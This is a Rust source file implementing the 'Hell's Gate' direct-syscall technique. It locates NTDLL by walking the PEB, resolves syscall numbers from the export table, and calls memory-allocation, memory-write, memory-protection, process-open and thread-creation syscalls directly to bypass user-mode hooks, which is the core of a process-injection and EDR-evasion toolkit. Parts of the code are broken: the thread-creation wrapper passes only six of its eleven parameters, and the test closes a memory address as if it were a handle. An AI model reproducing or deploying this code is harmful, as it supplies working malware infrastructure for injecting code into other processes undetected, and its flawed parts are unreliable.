#![allow(dead_code)]

use std::arch::asm;
use std::ffi::c_void;

#[repr(C)]
struct IMAGE_DOS_HEADER {
    e_magic: u16,
    _padding: [u8; 58],
    e_lfanew: i32,
}

#[repr(C)]
struct IMAGE_EXPORT_DIRECTORY {
    _characteristics: u32,
    _time_date_stamp: u32,
    _version: u32,
    _name: u32,
    _base: u32,
    number_of_functions: u32,
    number_of_names: u32,
    address_of_functions: u32,
    address_of_names: u32,
    address_of_name_ordinals: u32,
}

/// Get PEB from GS register (x64)
#[inline(never)]
unsafe fn get_peb() -> *mut c_void {
    let peb: *mut c_void;
    unsafe {
        asm!(
            "mov {}, gs:[0x60]",
            out(reg) peb,
        );
    }
    peb
}

/// Walk PEB to find NTDLL base address
#[inline(never)]
pub unsafe fn get_ntdll_base() -> *mut u8 {
    let peb = get_peb();
    if peb.is_null() {
        return std::ptr::null_mut();
    }
    
    // PEB->Ldr (offset 0x18)
    let ldr = *(peb.offset(0x18) as *const *mut c_void);
    if ldr.is_null() {
        return std::ptr::null_mut();
    }
    
    // InMemoryOrderModuleList (offset 0x20)
    let mut list_entry = *(ldr.offset(0x20) as *const *mut c_void);
    
    // Walk modules
    for _ in 0..20 {
        if list_entry.is_null() {
            break;
        }
        
        let dll_base = *(list_entry.offset(0x20) as *const *mut u8);
        let base_dll_name_buffer = *(list_entry.offset(0x50) as *const *const u16);
        
        if !base_dll_name_buffer.is_null() && !dll_base.is_null() {
            let mut name = Vec::new();
            for j in 0..64 {
                let c = *base_dll_name_buffer.offset(j);
                if c == 0 {
                    break;
                }
                name.push(c);
            }
            
            let name_str = String::from_utf16_lossy(&name);
            if name_str.to_uppercase().contains("NTDLL") {
                return dll_base;
            }
        }
        
        list_entry = *(list_entry as *const *mut c_void);
    }
    
    std::ptr::null_mut()
}

/// Parse PE Export Table and find function address
#[inline(never)]
pub unsafe fn get_function_address(ntdll_base: *mut u8, function_name: &str) -> *mut u8 {
    if ntdll_base.is_null() {
        return std::ptr::null_mut();
    }
    
    let dos_header = &*(ntdll_base as *const IMAGE_DOS_HEADER);
    if dos_header.e_magic != 0x5A4D {
        return std::ptr::null_mut();
    }
    
    let nt_headers_offset = dos_header.e_lfanew as isize;
    let nt_headers = ntdll_base.offset(nt_headers_offset);
    let signature = *(nt_headers as *const u32);
    
    if signature != 0x4550 {
        return std::ptr::null_mut();
    }
    
    // Export directory RVA is at NT_HEADERS + 0x88 for x64
    let export_dir_rva = *(nt_headers.offset(0x88) as *const u32);
    if export_dir_rva == 0 {
        return std::ptr::null_mut();
    }
    
    let export_dir = &*(ntdll_base.offset(export_dir_rva as isize) as *const IMAGE_EXPORT_DIRECTORY);
    
    let functions = ntdll_base.offset(export_dir.address_of_functions as isize) as *const u32;
    let names = ntdll_base.offset(export_dir.address_of_names as isize) as *const u32;
    let ordinals = ntdll_base.offset(export_dir.address_of_name_ordinals as isize) as *const u16;
    
    let fn_bytes = function_name.as_bytes();
    
    for i in 0..export_dir.number_of_names {
        let name_rva = *names.offset(i as isize);
        let name_ptr = ntdll_base.offset(name_rva as isize) as *const u8;
        
        let mut matches = true;
        for j in 0..fn_bytes.len() {
            if *name_ptr.offset(j as isize) != fn_bytes[j] {
                matches = false;
                break;
            }
        }
        
        if matches && *name_ptr.offset(fn_bytes.len() as isize) == 0 {
            let ordinal = *ordinals.offset(i as isize);
            let func_rva = *functions.offset(ordinal as isize);
            return ntdll_base.offset(func_rva as isize);
        }
    }
    
    std::ptr::null_mut()
}

/// Extract syscall number from function prologue
#[inline(never)]
pub unsafe fn get_syscall_number(func_addr: *mut u8) -> Option<u16> {
    if func_addr.is_null() {
        return None;
    }
    
    let bytes = std::slice::from_raw_parts(func_addr, 32);
    
    // Look for: mov eax, <imm32> (B8 XX XX 00 00)
    for i in 0..24 {
        if bytes[i] == 0xB8 && i + 4 < bytes.len() {
            return Some(u16::from_le_bytes([bytes[i + 1], bytes[i + 2]]));
        } else if bytes[i] == 0xBA && i + 4 < bytes.len() {
            return Some(u16::from_le_bytes([bytes[i + 1], bytes[i + 2]]));
        }
    }
    
    None
}

/// Execute syscall with 6 parameters
#[inline(never)]
pub unsafe fn syscall_6(ssn: u16, arg1: u64, arg2: u64, arg3: u64, arg4: u64, arg5: u64, arg6: u64) -> i32 {
    let mut result: i32;
    
    unsafe {
        asm!(
            "sub rsp, 0x38",
            "mov [rsp + 0x28], {arg5}",
            "mov [rsp + 0x30], {arg6}",
            "mov r10, rcx",
            "mov eax, {ssn:e}",
            "syscall",
            "add rsp, 0x38",
            ssn = in(reg) ssn as u32,
            arg5 = in(reg) arg5,
            arg6 = in(reg) arg6,
            in("rcx") arg1,
            in("rdx") arg2,
            in("r8") arg3,
            in("r9") arg4,
            lateout("eax") result,
        );
    }
    
    result
}

/// Execute syscall with 5 parameters
#[inline(never)]
pub unsafe fn syscall_5(ssn: u16, arg1: u64, arg2: u64, arg3: u64, arg4: u64, arg5: u64) -> i32 {
    syscall_6(ssn, arg1, arg2, arg3, arg4, arg5, 0)
}

/// Execute syscall with 4 parameters
#[inline(never)]
pub unsafe fn syscall_4(ssn: u16, arg1: u64, arg2: u64, arg3: u64, arg4: u64) -> i32 {
    syscall_6(ssn, arg1, arg2, arg3, arg4, 0, 0)
}

/// Execute syscall with 3 parameters
#[inline(never)]
pub unsafe fn syscall_3(ssn: u16, arg1: u64, arg2: u64, arg3: u64) -> i32 {
    syscall_6(ssn, arg1, arg2, arg3, 0, 0, 0)
}

/// Execute syscall with 2 parameters
#[inline(never)]
pub unsafe fn syscall_2(ssn: u16, arg1: u64, arg2: u64) -> i32 {
    syscall_6(ssn, arg1, arg2, 0, 0, 0, 0)
}

/// Execute syscall with 1 parameter
#[inline(never)]
pub unsafe fn syscall_1(ssn: u16, arg1: u64) -> i32 {
    syscall_6(ssn, arg1, 0, 0, 0, 0, 0)
}

/// Cached syscall numbers
pub struct SyscallCache {
    ntdll_base: usize,  // Changed from *mut u8 to usize for thread safety
    pub nt_allocate_virtual_memory: Option<u16>,
    pub nt_write_virtual_memory: Option<u16>,
    pub nt_protect_virtual_memory: Option<u16>,
    pub nt_create_thread_ex: Option<u16>,
    pub nt_open_process: Option<u16>,
    pub nt_close: Option<u16>,
    pub nt_query_system_information: Option<u16>,
    pub nt_create_file: Option<u16>,
    pub nt_read_file: Option<u16>,
    pub nt_write_file: Option<u16>,
}

unsafe impl Send for SyscallCache {}
unsafe impl Sync for SyscallCache {}

impl SyscallCache {
    /// Initialize syscall cache by resolving all syscall numbers
    pub fn new() -> Option<Self> {
        unsafe {
            let ntdll = get_ntdll_base();
            if ntdll.is_null() {
                return None;
            }
            
            Some(SyscallCache {
                ntdll_base: ntdll as usize,
                nt_allocate_virtual_memory: Self::resolve_ssn(ntdll, "NtAllocateVirtualMemory"),
                nt_write_virtual_memory: Self::resolve_ssn(ntdll, "NtWriteVirtualMemory"),
                nt_protect_virtual_memory: Self::resolve_ssn(ntdll, "NtProtectVirtualMemory"),
                nt_create_thread_ex: Self::resolve_ssn(ntdll, "NtCreateThreadEx"),
                nt_open_process: Self::resolve_ssn(ntdll, "NtOpenProcess"),
                nt_close: Self::resolve_ssn(ntdll, "NtClose"),
                nt_query_system_information: Self::resolve_ssn(ntdll, "NtQuerySystemInformation"),
                nt_create_file: Self::resolve_ssn(ntdll, "NtCreateFile"),
                nt_read_file: Self::resolve_ssn(ntdll, "NtReadFile"),
                nt_write_file: Self::resolve_ssn(ntdll, "NtWriteFile"),
            })
        }
    }
    
    unsafe fn resolve_ssn(ntdll: *mut u8, name: &str) -> Option<u16> {
        let func = get_function_address(ntdll, name);
        if func.is_null() {
            return None;
        }
        get_syscall_number(func)
    }
    
    /// NtAllocateVirtualMemory wrapper
    pub unsafe fn nt_allocate_virtual_memory(
        &self,
        process_handle: *mut c_void,
        base_address: *mut *mut c_void,
        zero_bits: usize,
        region_size: *mut usize,
        allocation_type: u32,
        protect: u32,
    ) -> i32 {
        if let Some(ssn) = self.nt_allocate_virtual_memory {
            syscall_6(
                ssn,
                process_handle as u64,
                base_address as u64,
                zero_bits as u64,
                region_size as u64,
                allocation_type as u64,
                protect as u64,
            )
        } else {
            0xC0000001u32 as i32  // STATUS_UNSUCCESSFUL
        }
    }
    
    /// NtClose wrapper
    pub unsafe fn nt_close(&self, handle: *mut c_void) -> i32 {
        if let Some(ssn) = self.nt_close {
            syscall_1(ssn, handle as u64)
        } else {
            0xC0000001u32 as i32
        }
    }
    
    /// NtWriteVirtualMemory wrapper
    pub unsafe fn nt_write_virtual_memory(
        &self,
        process_handle: *mut c_void,
        base_address: *mut c_void,
        buffer: *const c_void,
        number_of_bytes_to_write: usize,
        number_of_bytes_written: *mut usize,
    ) -> i32 {
        if let Some(ssn) = self.nt_write_virtual_memory {
            syscall_5(
                ssn,
                process_handle as u64,
                base_address as u64,
                buffer as u64,
                number_of_bytes_to_write as u64,
                number_of_bytes_written as u64,
            )
        } else {
            0xC0000001u32 as i32
        }
    }
    
    /// NtProtectVirtualMemory wrapper
    pub unsafe fn nt_protect_virtual_memory(
        &self,
        process_handle: *mut c_void,
        base_address: *mut *mut c_void,
        number_of_bytes_to_protect: *mut usize,
        new_protect: u32,
        old_protect: *mut u32,
    ) -> i32 {
        if let Some(ssn) = self.nt_protect_virtual_memory {
            syscall_5(
                ssn,
                process_handle as u64,
                base_address as u64,
                number_of_bytes_to_protect as u64,
                new_protect as u64,
                old_protect as u64,
            )
        } else {
            0xC0000001u32 as i32
        }
    }
    
    /// NtOpenProcess wrapper
    pub unsafe fn nt_open_process(
        &self,
        process_handle: *mut *mut c_void,
        desired_access: u32,
        object_attributes: *mut c_void,
        client_id: *mut c_void,
    ) -> i32 {
        if let Some(ssn) = self.nt_open_process {
            syscall_4(
                ssn,
                process_handle as u64,
                desired_access as u64,
                object_attributes as u64,
                client_id as u64,
            )
        } else {
            0xC0000001u32 as i32
        }
    }
    
    /// NtCreateThreadEx wrapper
    pub unsafe fn nt_create_thread_ex(
        &self,
        thread_handle: *mut *mut c_void,
        desired_access: u32,
        object_attributes: *mut c_void,
        process_handle: *mut c_void,
        start_routine: *mut c_void,
        argument: *mut c_void,
        create_flags: u32,
        zero_bits: usize,
        stack_size: usize,
        maximum_stack_size: usize,
        attribute_list: *mut c_void,
    ) -> i32 {
        if let Some(ssn) = self.nt_create_thread_ex {
            // NtCreateThreadEx has 11 parameters
            // First 4 in registers, rest on stack
            syscall_6(
                ssn,
                thread_handle as u64,
                desired_access as u64,
                object_attributes as u64,
                process_handle as u64,
                start_routine as u64,
                argument as u64,
            )
            // TODO: Need syscall_11 for full parameters
        } else {
            0xC0000001u32 as i32
        }
    }
}

use std::sync::OnceLock;

/// Global syscall cache (lazy initialized)
static GLOBAL_SYSCALL_CACHE: OnceLock<SyscallCache> = OnceLock::new();

/// Initialize global syscall cache
pub fn init_syscall_cache() -> bool {
    GLOBAL_SYSCALL_CACHE.get_or_init(|| {
        unsafe {
            SyscallCache::new().unwrap_or_else(|| {
                // Return empty cache if initialization fails
                SyscallCache {
                    ntdll_base: 0,
                    nt_allocate_virtual_memory: None,
                    nt_write_virtual_memory: None,
                    nt_protect_virtual_memory: None,
                    nt_create_thread_ex: None,
                    nt_open_process: None,
                    nt_close: None,
                    nt_query_system_information: None,
                    nt_create_file: None,
                    nt_read_file: None,
                    nt_write_file: None,
                }
            })
        }
    });
    GLOBAL_SYSCALL_CACHE.get().unwrap().ntdll_base != 0
}

/// Get global syscall cache
pub fn get_syscall_cache() -> Option<&'static SyscallCache> {
    GLOBAL_SYSCALL_CACHE.get()
}

/// Test Hell's Gate implementation
pub fn test_hells_gate() -> bool {
    unsafe {
        let cache = match SyscallCache::new() {
            Some(c) => c,
            None => {
                println!("[-] Failed to initialize syscall cache");
                return false;
            }
        };
        
        println!("[+] Hell's Gate initialized!");
        println!("[+] NTDLL base: 0x{:X}", cache.ntdll_base);
        println!("\n[*] Resolved Syscall Numbers:");
        
        let mut resolved = 0;
        let mut failed = 0;
        
        if let Some(ssn) = cache.nt_allocate_virtual_memory {
            println!("    [✓] NtAllocateVirtualMemory: 0x{:X} ({})", ssn, ssn);
            resolved += 1;
        } else {
            println!("    [✗] NtAllocateVirtualMemory: FAILED");
            failed += 1;
        }
        
        if let Some(ssn) = cache.nt_write_virtual_memory {
            println!("    [✓] NtWriteVirtualMemory: 0x{:X} ({})", ssn, ssn);
            resolved += 1;
        } else {
            println!("    [✗] NtWriteVirtualMemory: FAILED");
            failed += 1;
        }
        
        if let Some(ssn) = cache.nt_protect_virtual_memory {
            println!("    [✓] NtProtectVirtualMemory: 0x{:X} ({})", ssn, ssn);
            resolved += 1;
        } else {
            println!("    [✗] NtProtectVirtualMemory: FAILED");
            failed += 1;
        }
        
        if let Some(ssn) = cache.nt_create_thread_ex {
            println!("    [✓] NtCreateThreadEx: 0x{:X} ({})", ssn, ssn);
            resolved += 1;
        } else {
            println!("    [✗] NtCreateThreadEx: FAILED");
            failed += 1;
        }
        
        if let Some(ssn) = cache.nt_open_process {
            println!("    [✓] NtOpenProcess: 0x{:X} ({})", ssn, ssn);
            resolved += 1;
        } else {
            println!("    [✗] NtOpenProcess: FAILED");
            failed += 1;
        }
        
        if let Some(ssn) = cache.nt_close {
            println!("    [✓] NtClose: 0x{:X} ({})", ssn, ssn);
            resolved += 1;
        } else {
            println!("    [✗] NtClose: FAILED");
            failed += 1;
        }
        
        if let Some(ssn) = cache.nt_query_system_information {
            println!("    [✓] NtQuerySystemInformation: 0x{:X} ({})", ssn, ssn);
            resolved += 1;
        } else {
            println!("    [✗] NtQuerySystemInformation: FAILED");
            failed += 1;
        }
        
        if let Some(ssn) = cache.nt_create_file {
            println!("    [✓] NtCreateFile: 0x{:X} ({})", ssn, ssn);
            resolved += 1;
        } else {
            println!("    [✗] NtCreateFile: FAILED");
            failed += 1;
        }
        
        if let Some(ssn) = cache.nt_read_file {
            println!("    [✓] NtReadFile: 0x{:X} ({})", ssn, ssn);
            resolved += 1;
        } else {
            println!("    [✗] NtReadFile: FAILED");
            failed += 1;
        }
        
        if let Some(ssn) = cache.nt_write_file {
            println!("    [✓] NtWriteFile: 0x{:X} ({})", ssn, ssn);
            resolved += 1;
        } else {
            println!("    [✗] NtWriteFile: FAILED");
            failed += 1;
        }
        
        println!("\n[*] Summary: {}/{} syscalls resolved", resolved, resolved + failed);
        
        // Test allocation
        println!("\n[*] Testing NtAllocateVirtualMemory...");
        let current_process = -1isize as *mut c_void;
        let mut base_address: *mut c_void = std::ptr::null_mut();
        let mut region_size: usize = 0x1000;
        
        let status = cache.nt_allocate_virtual_memory(
            current_process,
            &mut base_address,
            0,
            &mut region_size,
            0x3000,  // MEM_COMMIT | MEM_RESERVE
            0x04,    // PAGE_READWRITE
        );
        
        if status == 0 {
            println!("[+] SUCCESS! Allocated {:p} ({}KB)", base_address, region_size / 1024);
            let _ = cache.nt_close(base_address);
            return true;
        } else {
            println!("[-] Failed with status: 0x{:X}", status as u32);
            return false;
        }
    }
}
